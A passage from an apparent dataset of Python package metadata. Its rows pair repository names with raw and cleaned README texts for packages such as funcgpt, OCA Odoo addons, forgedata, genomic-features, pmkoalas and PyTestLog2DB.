    """"""Returns true if the message is from a pirate.""""""
    ...

```

Usage:

```python
>>> is_pirate(""Arrr, I be doin' fine, matey."")
True
```

For choosing a different model or temperature, you can use the `model` and `temperature` keyword arguments:

```python
from funcgpt import gpt

@gpt(model=""gpt-4"", temperature=0)
def answer_like_pirate(message: str) -> str:
    """"""Answer questions like a pirate.""""""
    ...

```

## Contributing

We welcome contributions! Please feel free to fork the repository, make changes, and submit pull requests. If you have any questions or ideas, don't hesitate to open an issue.

## License

funcgpt is released under the MIT License. See the [LICENSE](LICENSE) file for more details.
",leandropls/funcgpt
odoo14-addon-delivery-schenker-picking-volume,https://github.com/OCA/delivery-carrier,3,2916,2544,"================================
Delivery Schenker Picking Volume
================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fdelivery--carrier-lightgray.png?logo=github
    :target: https://github.com/OCA/delivery-carrier/tree/14.0/delivery_schenker_picking_volume
    :alt: OCA/delivery-carrier
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/delivery-carrier-14-0/delivery-carrier-14-0-delivery_schenker_picking_volume
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/99/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This is a glue module between delivery_schenker and stock_picking_volume
With this module the transmitted volume is changed, it uses the computed volume from stock_picking_volume

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/delivery-carrier/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/delivery-carrier/issues/new?body=module:%20delivery_schenker_picking_volume%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) <mtietz@mt-software.de>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/delivery-carrier <https://github.com/OCA/delivery-carrier/tree/14.0/delivery_schenker_picking_volume>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","================================
Delivery Schenker Picking Volume
================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fdelivery--carrier-lightgray.png?logo=github
    :target: https://github.com/OCA/delivery-carrier/tree/14.0/delivery_schenker_picking_volume
    :alt: OCA/delivery-carrier
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/delivery-carrier-14-0/delivery-carrier-14-0-delivery_schenker_picking_volume
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/99/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This is a glue module between delivery_schenker and stock_picking_volume
With this module the transmitted volume is changed, it uses the computed volume from stock_picking_volume

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* MT Software

Contributors
~~~~~~~~~~~~

* Michael Tietz (MT Software) 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/delivery-carrier `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/delivery-carrier
rafnixg,https://github.com/rafnixg/rafnixg-lib,6,236,236,"# Rafnix Guzmán - Personal Card

## Hi there 👋

This is my personal card, you can see it in [rafnixg.dev](https://rafnixg.dev)

## How to use it? 🤔

Install using pip:

```bash
pip install rafnixg
```

Then run it:

```bash
rafnixg
```
","# Rafnix Guzmán - Personal Card

## Hi there 👋

This is my personal card, you can see it in [rafnixg.dev](https://rafnixg.dev)

## How to use it? 🤔

Install using pip:

```bash
pip install rafnixg
```

Then run it:

```bash
rafnixg
```
",rafnixg/rafnixg-lib
forgedata,https://github.com/ITSSOUMIT/ForgeData,1,3255,3255,"# ForgeData
A Python package for generating random dummy data for testing purposes.

Installation:
```bash
pip install forgedata
```

Data types supported as of `v1.0.1`:\
👉 [Name](#name)\
👉 [Email](#email)\
👉 [Password](#password)\
👉 [Website](#website)\
👉 [Phone](#phone)\
👉 [Country](#country)

### Name
```python
from forgedata import generator as ge
ge.name(type, quantity, gender='all')
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| type | **firstname** | To generate firstnames |
|| **lastname** | To generate lastnames |
|| **fullname** | To generate fullnames |
| quantity | **numeric value** | Quantity of results to be generated |
| gender | **male** | To generate male names |
|| **female** | To generate female names |
|| **all** (*Default*) | To generate a mix of both male and female names |

Output type: `Python list []`

### Email
```python
from forgedata import generator as ge
ge.email(quantity, domain=None)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
| domain | **None** (*Default*) | No specific domains, results can contain any random domains |
|| **common** | To generate email addresses using only gmail.com, yahoo.com, outlook.com, hotmail.com |
|| **[list]** | To generate email addresses using only the domains specified in the list |

Output type: `Python list []`

### Password
```python
from forgedata import generator as ge
ge.password(quantity, length, difficulty=""hard"")
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
| length | **numeric value** | Length of password |
| difficulty | **easy** | Password comprises only of **letters(upper and lower)** |
|| **medium** | Password comprises only of **letters(upper and lower)** and **digits** |
|| **hard** (*Default*) | Password comprises only of **letters(upper and lower)**, **digits** and **special characters** |

Output type: \
Single Password - `Python string` \
Mutilple Passwords - `Python list []`

### Website
```python
from forgedata import generator as ge
ge.website(quantity, domain=None, www=False)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
|domain|**None** (*Default*)|Domains can be both common and uncommon ones.|
||**common**| Only return common domain names|
|www|**False** (*Default*)|Donot prefix `www.` to the domains|
||**True**|Prefix `www.` to the domains|

Output type: `Python list []`

### Phone
```python
from forgedata import generator as ge
ge.phone(quantity)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |

Output type: `Python list []`

### Country
```python
from forgedata import generator as ge
ge.country(quantity, countrycode=False)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **all** (*Default*) | Returns list of all countries |
|| **numeric value** | Quantity of results to be generated |
|countrycode|**False** (*Default*)|Donot provide country code along with name|
||**True**|Provide country code along with name|

Output type: `Python list []`
","# ForgeData
A Python package for generating random dummy data for testing purposes.

Installation:
```bash
pip install forgedata
```

Data types supported as of `v1.0.1`:\
👉 [Name](#name)\
👉 [Email](#email)\
👉 [Password](#password)\
👉 [Website](#website)\
👉 [Phone](#phone)\
👉 [Country](#country)

### Name
```python
from forgedata import generator as ge
ge.name(type, quantity, gender='all')
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| type | **firstname** | To generate firstnames |
|| **lastname** | To generate lastnames |
|| **fullname** | To generate fullnames |
| quantity | **numeric value** | Quantity of results to be generated |
| gender | **male** | To generate male names |
|| **female** | To generate female names |
|| **all** (*Default*) | To generate a mix of both male and female names |

Output type: `Python list []`

### Email
```python
from forgedata import generator as ge
ge.email(quantity, domain=None)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
| domain | **None** (*Default*) | No specific domains, results can contain any random domains |
|| **common** | To generate email addresses using only gmail.com, yahoo.com, outlook.com, hotmail.com |
|| **[list]** | To generate email addresses using only the domains specified in the list |

Output type: `Python list []`

### Password
```python
from forgedata import generator as ge
ge.password(quantity, length, difficulty=""hard"")
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
| length | **numeric value** | Length of password |
| difficulty | **easy** | Password comprises only of **letters(upper and lower)** |
|| **medium** | Password comprises only of **letters(upper and lower)** and **digits** |
|| **hard** (*Default*) | Password comprises only of **letters(upper and lower)**, **digits** and **special characters** |

Output type: \
Single Password - `Python string` \
Mutilple Passwords - `Python list []`

### Website
```python
from forgedata import generator as ge
ge.website(quantity, domain=None, www=False)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |
|domain|**None** (*Default*)|Domains can be both common and uncommon ones.|
||**common**| Only return common domain names|
|www|**False** (*Default*)|Donot prefix `www.` to the domains|
||**True**|Prefix `www.` to the domains|

Output type: `Python list []`

### Phone
```python
from forgedata import generator as ge
ge.phone(quantity)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **numeric value** | Quantity of results to be generated |

Output type: `Python list []`

### Country
```python
from forgedata import generator as ge
ge.country(quantity, countrycode=False)
```
| Parameter | Type | Description |
| :-- | :-- | :-- |
| quantity | **all** (*Default*) | Returns list of all countries |
|| **numeric value** | Quantity of results to be generated |
|countrycode|**False** (*Default*)|Donot provide country code along with name|
||**True**|Provide country code along with name|

Output type: `Python list []`
",itssoumit/forgedata
genomic-features,https://github.com/scverse/genomic-features,18,1654,1493,"# genomic-features

[![Tests][badge-tests]][link-tests]
[![Documentation][badge-docs]][link-docs]

[badge-tests]: https://img.shields.io/github/actions/workflow/status/scverse/genomic-features/test.yaml?branch=main
[link-tests]: https://github.com/scverse/genomic-features/actions/workflows/test.yml
[badge-docs]: https://img.shields.io/readthedocs/genomic-features

Genomic annotations using BioConductor resources in Python.

## Getting started

Please refer to the [documentation][link-docs].

## Installation

You need to have Python 3.9 or newer installed on your system. If you don't have
Python installed, we recommend installing [Mambaforge](https://github.com/conda-forge/miniforge#mambaforge).

There are several alternative options to install genomic-features:

<!--
1) Install the latest release of `genomic-features` from `PyPI <https://pypi.org/project/genomic-features/>`_:

```bash
pip install genomic-features
```
-->

### Development install

To install the latest development version:

```bash
pip install git+https://github.com/scverse/genomic-features.git@main
```

## Release notes

See the [changelog][changelog].

## Contact

For questions and help requests, you can reach out in the [scverse discourse][scverse-discourse].
If you found a bug, please use the [issue tracker][issue-tracker].

## Citation

> t.b.a

[scverse-discourse]: https://discourse.scverse.org/
[issue-tracker]: https://github.com/scverse/genomic-features/issues
[changelog]: https://genomic-features.readthedocs.io/latest/changelog.html
[link-docs]: https://genomic-features.readthedocs.io
[link-api]: https://genomic-features.readthedocs.io/latest/api.html
","# genomic-features

[![Tests][badge-tests]][link-tests]
[![Documentation][badge-docs]][link-docs]

[badge-tests]: https://img.shields.io/github/actions/workflow/status/scverse/genomic-features/test.yaml?branch=main
[link-tests]: https://github.com/scverse/genomic-features/actions/workflows/test.yml
[badge-docs]: https://img.shields.io/readthedocs/genomic-features

Genomic annotations using BioConductor resources in Python.

## Getting started

Please refer to the [documentation][link-docs].

## Installation

You need to have Python 3.9 or newer installed on your system. If you don't have
Python installed, we recommend installing [Mambaforge](https://github.com/conda-forge/miniforge#mambaforge).

There are several alternative options to install genomic-features:



### Development install

To install the latest development version:

```bash
pip install git+https://github.com/scverse/genomic-features.git@main
```

## Release notes

See the [changelog][changelog].

## Contact

For questions and help requests, you can reach out in the [scverse discourse][scverse-discourse].
If you found a bug, please use the [issue tracker][issue-tracker].

## Citation

> t.b.a

[scverse-discourse]: https://discourse.scverse.org/
[issue-tracker]: https://github.com/scverse/genomic-features/issues
[changelog]: https://genomic-features.readthedocs.io/latest/changelog.html
[link-docs]: https://genomic-features.readthedocs.io
[link-api]: https://genomic-features.readthedocs.io/latest/api.html
",scverse/genomic-features
pdt-extract,https://github.com/DmitriLyalikov/pdt-canny-edge-detector,6,147,147,"This package provides modules and automation to perform edge profile extraction and characteristic feature approximation from pendant drop images.
","This package provides modules and automation to perform edge profile extraction and characteristic feature approximation from pendant drop images.
",dmitrilyalikov/pdt-canny-edge-detector
odoo-addon-user-all-groups,https://github.com/OCA/server-ux,1,4245,3868,"=======================
Admin User - All groups
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fserver--ux-lightgray.png?logo=github
    :target: https://github.com/OCA/server-ux/tree/16.0/user_all_groups
    :alt: OCA/server-ux
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-ux-16-0/server-ux-16-0-user_all_groups
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/250/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the base Odoo module, adding a new field on user form view
named 'Member of all Groups'.

If checked, the user will belong to all the groups (``res.groups``) and if a new module
is installed, the user(s) will automatically belong to the new created groups.

This feature can be interesting:

- on production, if you have some 'admin' users that want to access all features.

- in a development environment, when testing or developing new modules, to avoid fastidious
  initial configuration.

.. figure:: https://raw.githubusercontent.com/OCA/server-ux/16.0/user_all_groups/static/description/view_res_users_form.png


**Note**

- In Odoo Core, some groups are exclusive. This is the case for the three base groups
  ""Access Rights / Portal / Public"" and the two account groups ""Tax display B2B / Tax display B2C"".
  Users marked as ""Member of all Groups"" are NOT added to these exclusive groups.

- You could also be interested by another module named ``base_technical_features``
  in the same OCA repository.

- If you want to always have this feature installed when developing new module
  you could consider use ``module_change_auto_install`` module
  in the OCA / server-tools repository.

**Table of contents**

.. contents::
   :local:

Installation
============

If you want to always have this feature installed when developping new module
you could consider use ``module_change_auto_install`` module in the OCA / server-tools repository.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/server-ux/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/server-ux/issues/new?body=module:%20user_all_groups%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* GRAP

Contributors
~~~~~~~~~~~~

* Sylvain LE GAL <https://twitter.com/legalsylvain>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-legalsylvain| image:: https://github.com/legalsylvain.png?size=40px
    :target: https://github.com/legalsylvain
    :alt: legalsylvain

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-legalsylvain| 

This module is part of the `OCA/server-ux <https://github.com/OCA/server-ux/tree/16.0/user_all_groups>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=======================
Admin User - All groups
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fserver--ux-lightgray.png?logo=github
    :target: https://github.com/OCA/server-ux/tree/16.0/user_all_groups
    :alt: OCA/server-ux
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-ux-16-0/server-ux-16-0-user_all_groups
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/250/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the base Odoo module, adding a new field on user form view
named 'Member of all Groups'.

If checked, the user will belong to all the groups (``res.groups``) and if a new module
is installed, the user(s) will automatically belong to the new created groups.

This feature can be interesting:

- on production, if you have some 'admin' users that want to access all features.

- in a development environment, when testing or developing new modules, to avoid fastidious
  initial configuration.

.. figure:: https://raw.githubusercontent.com/OCA/server-ux/16.0/user_all_groups/static/description/view_res_users_form.png


**Note**

- In Odoo Core, some groups are exclusive. This is the case for the three base groups
  ""Access Rights / Portal / Public"" and the two account groups ""Tax display B2B / Tax display B2C"".
  Users marked as ""Member of all Groups"" are NOT added to these exclusive groups.

- You could also be interested by another module named ``base_technical_features``
  in the same OCA repository.

- If you want to always have this feature installed when developing new module
  you could consider use ``module_change_auto_install`` module
  in the OCA / server-tools repository.

**Table of contents**

.. contents::
   :local:

Installation
============

If you want to always have this feature installed when developping new module
you could consider use ``module_change_auto_install`` module in the OCA / server-tools repository.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* GRAP

Contributors
~~~~~~~~~~~~

* Sylvain LE GAL 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-legalsylvain| image:: https://github.com/legalsylvain.png?size=40px
    :target: https://github.com/legalsylvain
    :alt: legalsylvain

Current `maintainer `__:

|maintainer-legalsylvain| 

This module is part of the `OCA/server-ux `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/server-ux
tpot2,https://github.com/EpistasisLab/tpot2,23,112,112,"
A Python tool that automatically creates and optimizes machine learning pipelines using genetic programming.


","
A Python tool that automatically creates and optimizes machine learning pipelines using genetic programming.


",epistasislab/tpot2
digitalassistant,https://github.com/shubhvjain/ant,0,0,0,,,shubhvjain/ant
pmkoalas,https://github.com/AdamBanham/koalas,2,1222,1222,"# pmkoalas: A Process Mining Project
[![Python 3.[9,10,11]](https://github.com/AdamBanham/koalas/actions/workflows/python-version.yml/badge.svg?branch=main)](https://github.com/AdamBanham/koalas/actions/workflows/python-version.yml)   [![Testing](https://github.com/AdamBanham/koalas/actions/workflows/python-unittests.yml/badge.svg)](https://github.com/AdamBanham/koalas/actions/workflows/python-unittests.yml)


`pmkoalas` provides data structures for process mining research in a well-organized pythonic style.

# Development
To install the library as a local copy, such that edits to source will be automatically translated into your intercepter use the following command:
`py -m pip install -e .[dev]`

## Test
To run tests use the following command
`py -m pip install -e .[dev] && py -m unittest`

# Values of the team

## Postel's law
[https://en.wikipedia.org/wiki/Jon_Postel](cite)
Perhaps his most famous legacy is from RFC760, which includes a robustness principle often called Postel's law: ""an implementation should be conservative in its sending behavior, and liberal in its receiving behavior"" (reworded in RFC 1122 as ""Be liberal in what you accept, and conservative in what you send"").
","# pmkoalas: A Process Mining Project
[![Python 3.[9,10,11]](https://github.com/AdamBanham/koalas/actions/workflows/python-version.yml/badge.svg?branch=main)](https://github.com/AdamBanham/koalas/actions/workflows/python-version.yml)   [![Testing](https://github.com/AdamBanham/koalas/actions/workflows/python-unittests.yml/badge.svg)](https://github.com/AdamBanham/koalas/actions/workflows/python-unittests.yml)


`pmkoalas` provides data structures for process mining research in a well-organized pythonic style.

# Development
To install the library as a local copy, such that edits to source will be automatically translated into your intercepter use the following command:
`py -m pip install -e .[dev]`

## Test
To run tests use the following command
`py -m pip install -e .[dev] && py -m unittest`

# Values of the team

## Postel's law
[https://en.wikipedia.org/wiki/Jon_Postel](cite)
Perhaps his most famous legacy is from RFC760, which includes a robustness principle often called Postel's law: ""an implementation should be conservative in its sending behavior, and liberal in its receiving behavior"" (reworded in RFC 1122 as ""Be liberal in what you accept, and conservative in what you send"").
",adambanham/koalas
pytestlog2db,https://github.com/test-fullautomation/python-pytestlog2db,3,8776,8665,"PyTestLog2DB
============

Table of Contents
-----------------

-   [Getting Started](#getting-started)
    -   [How to install](#how-to-install)
-   [Usage](#usage)
-   [Example](#example)
-   [Contribution](#contribution)
-   [Sourcecode Documentation](#sourcecode-documentation)
-   [Feedback](#feedback)
-   [About](#about)
    -   [Maintainers](#maintainers)
    -   [Contributors](#contributors)
    -   [License](#license)

Getting Started
---------------

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
is the tool that helps to import [PyTest](https://docs.pytest.org)
results file(s) (as [JUnit XML](https://llg.cubic.org/docs/junit)
format) to
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)
Dashboard.

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
tool is operating system independent and only works with Python 3.

### How to install

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
is not available on [PyPI](https://pypi.org/) now.

But you can install this package directly from Github repository as
below:

    pip install git+https://github.com/test-fullautomation/python-pytestlog2db.git

Or you can clone sourcecode to your local directory then install this
package with below steps:

    git clone https://github.com/test-fullautomation/python-pytestlog2db.git
    cd python-pytestlog2db
    python setup.py install

After succesful installation, the executable file **PyTestLog2DB** will
be available (under *Scripts* folder of Python on Windows and
*\~/.local/bin/* folder on Linux).

In case above location is added to **PATH** environment variable then
you can run it directly as operation system\'s command.

Usage
-----

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
requires the [PyTest](https://docs.pytest.org) result file(s) which
contains the test result in [JUnit
XML](https://llg.cubic.org/docs/junit) format and
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)\'s
database information for importing.

Use below command to get tools\'s usage

    PyTestLog2DB -h

The usage should be showed as below:

    usage: PyTestLog2DB (PyTestXMLReport to TestResultWebApp importer) [-h] [-v] [--recursive] [--dryrun] [--append] [--UUID UUID] [--variant VARIANT] [--versions VERSIONS] [--config CONFIG] 
                                                                       resultxmlfile server user password database

    PyTestLog2DB imports pytest JUnit XML report file(s)generated by pytest into a WebApp database.

    positional arguments:
    resultxmlfile        absolute or relative path to the pytest JUnit XML report file or directory of report files to be imported.
    server               server which hosts the database (IP or URL).
    user                 user for database login.
    password             password for database login.
    database             database schema for database login.

    optional arguments:
    -h, --help           show this help message and exit
    -v                   Version of the PyTestLog2DB importer.
    --recursive          if set, then the path is searched recursively for output files to be imported.
    --dryrun             if set, then verify all input arguments (includes DB connection) and show what would be done.
    --append             is used in combination with --UUID <UUID>. If set, allow to append new result(s) to existing execution result UUID in -UUID argument.
    --UUID UUID          UUID used to identify the import and version ID on webapp. If not provided PyTestLog2DB will generate an UUID for the whole import.
    --variant VARIANT    variant name to be set for this import.
    --versions VERSIONS  metadata: Versions (Software;Hardware;Test) to be set for this import (semicolon separated).
    --config CONFIG      configuration json file for component mapping information.

The below command is simple usage with all required arguments to import
[PyTest](https://docs.pytest.org) results into TestResultWebApp\'s
database:

    PyTestLog2DB <resultxmlfile> <server> <user> <password> <database>

Besides the executable file, you can also run tool as a Python module

    python -m PyTestLog2DB <resultxmlfile> <server> <user> <password> <database>

Example
-------

In order the import the robot result(s) to TestResultWebApp\'s database,
we need the [PyTest](https://docs.pytest.org) result file in [JUnit
XML](https://llg.cubic.org/docs/junit) format.

So, firstly execute the [PyTest](https://docs.pytest.org) testcase(s) to
get the result file(s). But the **\*.xml** result file is not generated
by default.

We need to specify the argument *\--junit-xml=\<path\>* when executing
[PyTest](https://docs.pytest.org) to get the generated [JUnit
XML](https://llg.cubic.org/docs/junit) report file at given path.

E.g: :

    pytest --junit-xml=path/to/result.xml pytest/folder

After that, the **\*.xml** result file will be available at
**path/to/result.xml** and can be used for importing to
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)
with command:

    PyTestLog2DB path/to/result.xml localhost test_user test_pw test_db

Then, open TestResultWebApp with your favourite browser and you will see
how wonderful the execution result is displayed as below figures:

Dashboard view:

![Dashboard view](packagedoc/additional_docs/pictures/Dashboard.png)

Datatable view:

![Datatable view](packagedoc/additional_docs/pictures/Datatable.png)

### Notes:

> The **\*.xml** report file generated by PyTest contains only the
> testcase result(s) and less metadata information about the test
> execution such as *project/variant*, *software version*, *tester* ,
> *component*, \... which are required by
> [TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp).
>
> So that,
> [PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
> will handle those information with the default values.
>
> But you can use the optional argument *\--config CONFIG* to specify
> those information when importing to
> [TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)\'s
> database.
>
> Sample configuration file:
>
>     {
>        ""variant""   : ""MyProject"",
>        ""version_sw"": ""0.1.1"",
>        ""components"": {
>           ""Testsuite1""       : ""test-data.test_tsclass.TestSuite1"",
>           ""Testsuite2""       : ""test-data.test_tsclass.TestSuite2"",
>           ""Others""          : [
>              ""test-data.test_ts1"",
>              ""test-data.test_ts2""
>           ]
>        },
>        ""tester""    : ""Tran Duy Ngoan""
>     }
>
> Please refer [PyTestLog2DB tool's
> Documentation](https://github.com/test-fullautomation/python-pytestlog2db/blob/develop/PyTestLog2DB/PyTestLog2DB.pdf)
> for more detail about default values and the configuration json file.

Contribution
------------

We are always searching support and you are cordially invited to help to
improve
[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
tool.

Sourcecode Documentation
------------------------

To understand more detail about the tool\'s features, parameters and how
PyTest result(s) will be displayed on TestResultWebApp, please refer to
[PyTestLog2DB tool's
Documentation](https://github.com/test-fullautomation/python-pytestlog2db/blob/develop/PyTestLog2DB/PyTestLog2DB.pdf).

Feedback
--------

Please feel free to give any feedback to us via

Email to: [Thomas Pollerspöck](mailto:Thomas.Pollerspoeck@de.bosch.com)

Issue tracking: [PyTestLog2DB
Issues](https://github.com/test-fullautomation/python-pytestlog2db/issues)

About
-----

### Maintainers

[Thomas Pollerspöck](mailto:Thomas.Pollerspoeck@de.bosch.com)

[Holger Queckenstedt](mailto:Holger.Queckenstedt@de.bosch.com)

[Tran Duy Ngoan](mailto:Ngoan.TranDuy@vn.bosch.com)

### Contributors

[Nguyen Huynh Tri Cuong](mailto:Cuong.NguyenHuynhTri@vn.bosch.com)

[Mai Dinh Nam Son](mailto:Son.MaiDinhNam@vn.bosch.com)

[Tran Hoang Nguyen](mailto:Nguyen.TranHoang@vn.bosch.com)

### License

Copyright 2020-2022 Robert Bosch GmbH

Licensed under the Apache License, Version 2.0 (the \""License\""); you
may not use this file except in compliance with the License. You may
obtain a copy of the License at

> [![License: Apache
> v2](https://img.shields.io/pypi/l/robotframework.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an \""AS IS\"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.


","PyTestLog2DB
============

Table of Contents
-----------------

-   [Getting Started](#getting-started)
    -   [How to install](#how-to-install)
-   [Usage](#usage)
-   [Example](#example)
-   [Contribution](#contribution)
-   [Sourcecode Documentation](#sourcecode-documentation)
-   [Feedback](#feedback)
-   [About](#about)
